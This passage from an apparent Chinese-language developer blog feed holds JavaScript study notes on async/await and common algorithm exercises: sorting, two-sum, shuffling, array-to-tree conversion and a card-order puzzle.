console.log(2)</span><br><span class="line">  const a = await Promise.resolve(&apos;a&apos;)</span><br><span class="line">  const b = await Promise.resolve(&apos;b&apos;)</span><br><span class="line">  const c = await Promise.resolve(&apos;c&apos;)</span><br><span class="line">  console.log(3)</span><br><span class="line">  return [a, b, c]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">asyncFunc().then(res =&gt; &#123;</span><br><span class="line">  console.log(res)</span><br><span class="line">&#125;)</span><br><span class="line">// 测试结果相同</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>思考一下代码的执行结果，todo: generator 源码不是一直 while 吗？<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">async function test() &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;console.log(&apos;ffff&apos;)&#125;, 2000)</span><br><span class="line">    await new Promise((resolve) =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">            resolve()</span><br><span class="line">            console.log(&apos;10s&apos;)</span><br><span class="line">        &#125;, 10000)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[算法题目]]></title>
      <url>https://fuzhongfeng.github.io/2018/05/19/algorithm-questions/</url>
      <content type="html"><![CDATA[<h2 id="1-排序算法"><a href="#1-排序算法" class="headerlink" title="1. 排序算法"></a>1. 排序算法</h2><ol>
<li><p>冒泡排序: 双层循环，两两比较交换位置。复杂度 O(n^2)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const bubbleSort = (arr) =&gt; &#123;</span><br><span class="line">  const len = arr.length;</span><br><span class="line">  for (let i = 0; i &lt; len; i ++) &#123;</span><br><span class="line">    for (let j = 0; j &lt; len - 1 - i; j ++) &#123; // 内循环每一轮结束后最后一个数为最大，此处可以减少多余的比较</span><br><span class="line">      if (arr[j] &gt; arr[j + 1]) &#123;</span><br><span class="line">        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>快速排序: 时间复杂度 O(nlogn)，空间复杂度 O(nlogn)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">const quick = function(array, left, right) &#123;</span><br><span class="line">  if (array.length &lt;= 1) return;</span><br><span class="line"></span><br><span class="line">  // 循环一次后将数组分为两部分，但不同冒泡无法保证任何一个元素的准确位置。</span><br><span class="line">  let index = partition(array, left, right);</span><br><span class="line"></span><br><span class="line">  // 因为 partition 函数中 left &gt; right，所以 left 到 index - 1 确定一个子数组</span><br><span class="line">  if (left &lt; index - 1) &#123;</span><br><span class="line">    quick(array, left, index - 1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (index &lt; right) &#123;</span><br><span class="line">    quick(array, index, right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 分区</span><br><span class="line">const partition = function(array, left, right) &#123;</span><br><span class="line">  const pivot = array[Math.floor((left + right) / 2)];</span><br><span class="line"></span><br><span class="line">  while (left &lt;= right) &#123;</span><br><span class="line">    while (array[left] &lt; pivot) &#123;</span><br><span class="line">      left++;</span><br><span class="line">    &#125;</span><br><span class="line">    while (array[right] &gt; pivot) &#123;</span><br><span class="line">      right--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (left &lt;= right) &#123;</span><br><span class="line">      swap(array, left, right);</span><br><span class="line"></span><br><span class="line">      left++;</span><br><span class="line">      right--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return left;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const swap = (arr, i, j) =&gt; &#123;</span><br><span class="line">  [arr[i], arr[j]] = [arr[j], arr[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// quick(array, 0, array.length - 1);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>// 快速排序的另一种写法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function qsort(arr, low, high) &#123;</span><br><span class="line">    if (low &lt; high) &#123;</span><br><span class="line">        var mid = partition(arr, low, high);</span><br><span class="line">        qsort(arr, low, mid - 1);</span><br><span class="line">        qsort(arr, mid + 1, high);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function partition(arr, low, high) &#123;</span><br><span class="line">    var i = low - 1;</span><br><span class="line">    var j = high;</span><br><span class="line">    var pivot = arr[high];    </span><br><span class="line"></span><br><span class="line">    while(1) &#123;</span><br><span class="line">        while(arr[++i] &lt; pivot);</span><br><span class="line">        while(arr[--j] &gt; pivot);</span><br><span class="line">        if (i &lt; j) &#123;</span><br><span class="line">            swap(arr, i, j)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    swap(arr, i, high)</span><br><span class="line"></span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function swap(arr, i, j) &#123;</span><br><span class="line">    [arr[i], arr[j]] = [arr[j], arr[i]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li>堆排序, 时间复杂度 O(nlogn)，空间复杂度 O(1)<blockquote>
<p>实现思路如下：</p>
</blockquote>
</li>
</ol>
<ul>
<li>将无序数组构建成一个堆，根据升序降序需求选择大顶堆或小顶堆;</li>
<li>将堆顶元素与末尾元素交换，将最大(或最小)元素放到数组末端;</li>
<li>重新调整结构，使其满足堆定义。然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个数组排序完成;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 排序</span><br><span class="line"> * @param &#123;*&#125; array </span><br><span class="line"> * @param &#123;*&#125; k 排序 k 个元素，k &gt;= 1 &amp;&amp; k &lt;= array.length。可解决 topK 问题</span><br><span class="line"> */</span><br><span class="line"> function heapSort(array, k) &#123;</span><br><span class="line">   var heapSize = array.length;</span><br><span class="line">   var limit = k !== undefined ? heapSize - k : 1</span><br><span class="line"></span><br><span class="line">   // 构建堆</span><br><span class="line">   buildHeap(array);</span><br><span class="line">   while (heapSize &gt; limit) &#123;</span><br><span class="line">     heapSize--;</span><br><span class="line">     // 将堆顶的根节点与末尾元素进行交换，剩余的元素反复执行便得到一个有序数组</span><br><span class="line">     swap(array, 0, heapSize);</span><br><span class="line">     heapify(array, heapSize, 0);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 将数组构建成堆。</span><br><span class="line"> */</span><br><span class="line"> function buildHeap(array) &#123;</span><br><span class="line">   var heapSize = array.length;</span><br><span class="line">   for (var i = Math.floor(array.length / 2); i &gt;= 0; i--) &#123;</span><br><span class="line">     heapify(array, heapSize, i);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 构建堆需要满足的条件：</span><br><span class="line"> * 大顶堆：array[i] &gt;= array[2i+1] &amp;&amp; array[i] &gt;= array[2i+2]  </span><br><span class="line"> * 小顶堆：array[i] &lt;= array[2i+1] &amp;&amp; array[i] &lt;= arr[2i+2]</span><br><span class="line"> */</span><br><span class="line"> function heapify(array, heapSize, i) &#123;</span><br><span class="line">   var left = i * 2 + 1,</span><br><span class="line">     right = i * 2 + 2,</span><br><span class="line">     largest = i;</span><br><span class="line">   if (left &lt; heapSize &amp;&amp; array[left] &gt; array[largest]) &#123;</span><br><span class="line">     largest = left;</span><br><span class="line">   &#125;</span><br><span class="line">   if (right &lt; heapSize &amp;&amp; array[right] &gt; array[largest]) &#123;</span><br><span class="line">     largest = right;</span><br><span class="line">   &#125;</span><br><span class="line">   if (largest !== i) &#123;</span><br><span class="line">     swap(array, i, largest);</span><br><span class="line">     heapify(array, heapSize, largest);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function swap(arr, i, j) &#123;</span><br><span class="line">   [arr[i], arr[j]] = [arr[j], arr[i]];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>参考：<a href="https://www.cnblogs.com/chengxiao/p/6129630.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengxiao/p/6129630.html</a></p>
<h2 id="2-给定一个整数数组和一个目标值，找出数组中和为目标值的两个数的做索引组成的数组。你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。例子如下："><a href="#2-给定一个整数数组和一个目标值，找出数组中和为目标值的两个数的做索引组成的数组。你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。例子如下：" class="headerlink" title="2. 给定一个整数数组和一个目标值，找出数组中和为目标值的两个数的做索引组成的数组。你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。例子如下："></a>2. 给定一个整数数组和一个目标值，找出数组中和为目标值的两个数的做索引组成的数组。你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。例子如下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>
<p>答案：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 时间复杂度 O(1)</span><br><span class="line">var twoSum = function(nums, target) &#123;</span><br><span class="line">    const map = new Map();</span><br><span class="line">    let arr = []</span><br><span class="line">    for (let i = nums.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">        const j = map.get(target - nums[i]);</span><br><span class="line">        if (j !== undefined) &#123;</span><br><span class="line">          arr = [i, j];</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">        map.set(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    return arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-实现数组乱序算法，要求每个数字出现在每个位置的概率是平均的。"><a href="#3-实现数组乱序算法，要求每个数字出现在每个位置的概率是平均的。" class="headerlink" title="3. 实现数组乱序算法，要求每个数字出现在每个位置的概率是平均的。"></a>3. 实现数组乱序算法，要求每个数字出现在每个位置的概率是平均的。</h2><ul>
<li>验证 random 方法是否完全随机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const test = (random) =&gt; &#123;</span><br><span class="line">  let n = 100000; </span><br><span class="line">  // 保存每个元素在每个位置上出现的次数</span><br><span class="line">  const countArr = Array.from(&#123;length:10&#125;).fill(0)</span><br><span class="line">  for (let i = 0; i &lt; n; i ++) &#123;</span><br><span class="line">      let arr = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;];</span><br><span class="line">      random(arr);</span><br><span class="line">      countArr[arr.indexOf(&apos;a&apos;)]++;</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(countArr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>使用 sort 的简单实现并不能真正的随机，并且时间复杂度为O(n^2)，不能随机的原因在于两个元素之间比较次数不够。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// Math.random() [0, 1)</span><br><span class="line">const random = (arr) =&gt; arr.sort((a, b) =&gt; Math.random() - 0.5)</span><br><span class="line">test(random) // [19361, 13712, 8985, 7444, 6726, 7530, 8240, 8483, 9280, 10239] 可见并不随机</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>改写 sort 方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const random = (arr) =&gt; &#123;</span><br><span class="line">    let newArr = arr.map(n =&gt; (&#123;v: n, r: Math.random()&#125;));</span><br><span class="line">    newArr.sort((a, b) =&gt; a.r - b.r);</span><br><span class="line">    arr.splice(0,arr.length,...newArr.map(o =&gt; o.v));</span><br><span class="line">    return arr;</span><br><span class="line">&#125;;</span><br><span class="line">test(random) // [10052, 10066, 9959, 9912, 10040, 9995, 9996, 10088, 9903, 9989] 可实现随机</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>通过洗牌算法实现，复杂度为 O(n)。强烈推荐！！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const random = (arr) =&gt; &#123;</span><br><span class="line">    let len = arr.length</span><br><span class="line">    while(len &gt; 1) &#123;</span><br><span class="line">        let index = Math.floor(Math.random() * len--);</span><br><span class="line">        [arr[len], arr[index]] = [arr[index], arr[len]];</span><br><span class="line">    &#125;</span><br><span class="line">    return arr</span><br><span class="line">&#125;</span><br><span class="line">test(random) // [10135, 9962, 10090, 10051, 9963, 9781, 10063, 10053, 10038, 9864]</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="4-一维数组转树形结构"><a href="#4-一维数组转树形结构" class="headerlink" title="4. 一维数组转树形结构"></a>4. 一维数组转树形结构</h2><ul>
<li><p>实现无限制层级的文件夹菜单树，数据库返回的一维数组结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 顺序不确定</span><br><span class="line">const arr = [</span><br><span class="line">  &#123;&quot;id&quot;:&quot;1&quot;, &quot;pId&quot;:&quot;0&quot;, &quot;name&quot;:&quot;节点1 - 展开&quot;, &quot;open&quot;:true&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;1-1&quot;, &quot;pId&quot;:&quot;1&quot;, &quot;name&quot;:&quot;节点1-1 - 折叠&quot;&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;1-2&quot;, &quot;pId&quot;:&quot;1&quot;, &quot;name&quot;:&quot;节点1-2 - 折叠&quot;&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;1-3&quot;, &quot;pId&quot;:&quot;1&quot;, &quot;name&quot;:&quot;节点1-3 - 折叠&quot;, &quot;open&quot;:true&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;1-3-1&quot;, &quot;pId&quot;:&quot;1-3&quot;, &quot;name&quot;:&quot;节点1-3-1 - 没有子节点&quot;&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;2&quot;, &quot;pId&quot;:&quot;0&quot;, &quot;name&quot;:&quot;节点2 - 折叠&quot;&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;2-1&quot;, &quot;pId&quot;:&quot;2&quot;, &quot;name&quot;:&quot;节点2-1 - 展开&quot;, &quot;open&quot;:true&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;2-2&quot;, &quot;pId&quot;:&quot;2&quot;, &quot;name&quot;:&quot;节点2-2 - 折叠&quot;&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;2-3&quot;, &quot;pId&quot;:&quot;2&quot;, &quot;name&quot;:&quot;节点2-3 - 折叠&quot;&#125;,</span><br><span class="line">  &#123;&quot;id&quot;:&quot;3&quot;, &quot;pId&quot;:&quot;0&quot;, &quot;name&quot;:&quot;节点3 - 没有子节点&quot;&#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
</li>
<li><p>需要生成如下树转结构便于进行展示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">const data = [</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;pId&quot;: &quot;0&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;节点1 - 展开&quot;,</span><br><span class="line">    &quot;open&quot;: true,</span><br><span class="line">    &quot;children&quot;: [&#123;</span><br><span class="line">      &quot;id&quot;: &quot;1-1&quot;,</span><br><span class="line">      &quot;pId&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;节点1-1 - 折叠&quot;,</span><br><span class="line">      &quot;children&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;id&quot;: &quot;1-2&quot;,</span><br><span class="line">      &quot;pId&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;节点1-2 - 折叠&quot;,</span><br><span class="line">      &quot;children&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;id&quot;: &quot;1-3&quot;,</span><br><span class="line">      &quot;pId&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;节点1-3 - 折叠&quot;,</span><br><span class="line">      &quot;open&quot;: true,</span><br><span class="line">      &quot;children&quot;: [&#123;</span><br><span class="line">        &quot;id&quot;: &quot;1-3-1&quot;,</span><br><span class="line">        &quot;pId&quot;: &quot;1-3&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;节点1-3-1 - 没有子节点&quot;,</span><br><span class="line">        &quot;children&quot;: []</span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;pId&quot;: &quot;0&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;节点2 - 折叠&quot;,</span><br><span class="line">    &quot;children&quot;: [&#123;</span><br><span class="line">      &quot;id&quot;: &quot;2-1&quot;,</span><br><span class="line">      &quot;pId&quot;: &quot;2&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;节点2-1 - 展开&quot;,</span><br><span class="line">      &quot;open&quot;: true,</span><br><span class="line">      &quot;children&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;id&quot;: &quot;2-2&quot;,</span><br><span class="line">      &quot;pId&quot;: &quot;2&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;节点2-2 - 折叠&quot;,</span><br><span class="line">      &quot;children&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;id&quot;: &quot;2-3&quot;,</span><br><span class="line">      &quot;pId&quot;: &quot;2&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;节点2-3 - 折叠&quot;,</span><br><span class="line">      &quot;children&quot;: []</span><br><span class="line">    &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;pId&quot;: &quot;0&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;节点3 - 没有子节点&quot;,</span><br><span class="line">    &quot;children&quot;: []</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>实现方式如下：<br>/**</p>
<ul>
<li>可重命名字段<br>*/<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const getTree = (data, rootId, id = &apos;id&apos;, pId = &apos;pId&apos;, children = &apos;children&apos;) =&gt; &#123;</span><br><span class="line">    const getNode = (p_id) =&gt; &#123;</span><br><span class="line">        const node = [];</span><br><span class="line">        for (let i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            if (data[i][pId] === p_id) &#123;</span><br><span class="line">                data[i][children] = getNode(data[i][id]);</span><br><span class="line">                node.push(data[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return node;</span><br><span class="line">    &#125;</span><br><span class="line">    return getNode(rootId)</span><br><span class="line">&#125;;</span><br><span class="line">getTree(data, &apos;0&apos;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="扑克牌顺序问题："><a href="#扑克牌顺序问题：" class="headerlink" title="扑克牌顺序问题："></a>扑克牌顺序问题：</h2><p>有一堆扑克牌, 将牌堆第一张放到桌子上，再将牌堆的第一张放到牌底，如此往复；最后桌子上的牌顺序为：（牌底）1,2,3,4,5,6,7,8,9,10,11,12,13(牌顶)；<br>问：原来那堆牌的顺序，用函数实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 分析与抽象：</span><br><span class="line">// 1. 最重要的想清楚这件事：每次将牌从牌头放到牌底和桌子上的这一系列操作是可逆的！</span><br><span class="line">// 如桌子上已经有了一张牌、那我一共做了两个操作即：a.将牌从牌头放到牌底 b. 将牌从牌头放到桌子上</span><br><span class="line">// 逆向还原时先执行b，再执行a即可还原为最初状态。多张牌还原相当于还原多次逆向操作。</span><br><span class="line">// 还原函数即为手拿扑克牌还原的过程。</span><br><span class="line">// 2. 牌堆可以看成数组，牌底对应数组尾部，牌顶对应数组头部。</span><br><span class="line">// 3. 最后牌堆抽象为数组为: var final = [13,12,11,10,9,8,7,6,5,4,3,2,1]</span><br><span class="line">// 4. 原来牌堆抽象可以抽象为一个新数组：var initial = []</span><br><span class="line"></span><br><span class="line">  var final = [13,12,11,10,9,8,7,6,5,4,3,2,1];</span><br><span class="line">  function reverse(arr) &#123;</span><br><span class="line">    var result = [];</span><br><span class="line">    for (var i = 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">      result.length &gt; 0 &amp;&amp; result.unshift(result.pop());</span><br><span class="line">      result.unshift(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  console.log(reverse(final)) // [1, 12, 2, 8, 3, 11, 4, 9, 5, 13, 6, 10, 7]</span><br></pre></td></tr></table></figure></p>
<h2 id="KMP-算法"><a href="#KMP-算法" class="headerlink" title="KMP 算法"></a>KMP 算法</h2>]]></content>
      
        <categories>
            
            <category> Data Structure And Algorithm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Data Structure And Algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-setTimeout]]></title>
      <url>https://fuzhongfeng.github.io/2018/05/06/2108-5-06-javascript-setTimeout/</url>
      <content type="html"><![CDATA[<p>setTimeout 之前也有过很多次接触，这次统一梳理一下，其中关于<code>最小延迟</code>和<code>超时延迟</code>还是不太理解</p>
